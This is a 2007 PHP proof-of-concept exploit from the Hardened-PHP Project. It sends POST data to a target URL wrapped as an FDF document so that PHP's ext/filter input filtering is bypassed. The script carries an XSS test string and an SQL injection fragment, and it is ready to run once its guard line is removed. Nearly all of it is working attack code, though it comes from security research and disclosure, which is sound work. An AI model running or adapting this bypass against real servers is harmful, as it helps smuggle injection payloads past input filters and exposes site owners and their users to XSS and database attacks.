<?php
  ////////////////////////////////////////////////////////////////////////
  //  _  _                _                     _       ___  _  _  ___  //
  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
  //                                                                    //
  //         Proof of concept code from the Hardened-PHP Project        //
  //                   (C) Copyright 2007 Stefan Esser                  //
  //                                                                    //
  ////////////////////////////////////////////////////////////////////////
  //            PHP ext/filtet FDF POST Filter Bybass Exploit           //
  ////////////////////////////////////////////////////////////////////////

  // This is meant as a protection against remote file inclusion.
  die("REMOVE THIS LINE");

  // _POST is the array that will be sent to the url in $url
  $_POST = array();
  $_POST['var1'] = "<script>alert(/XSS/);</script>";
  $_POST['var2'] = " ' UNION SELECT ";

  $url = "http://127.0.0.1/info.php";  
  
  // You do not need to change anything below this
  
  $outfdf = fdf_create();
  foreach ($_POST as $key => $value) {
    fdf_set_value($outfdf, $key, $value, 0);
  }
  fdf_save($outfdf, "outtest.fdf");
  fdf_close($outfdf);
  
  $ret = file_get_contents("outtest.fdf");
  unlink("outtest.fdf");
  
  $params = array('http' => array(
      'method' => 'POST',
      'content' => $ret,
      'header' => 'Content-Type: application/vnd.fdf'
  ));
  
  $ctx = stream_context_create($params);
  $fp = @fopen($url, 'rb', false, $ctx);
  if (!$fp) {
    die("Cannot open $url");
  }
  $response = @stream_get_contents($fp); 

  echo $response;
  echo "\n";
?> 
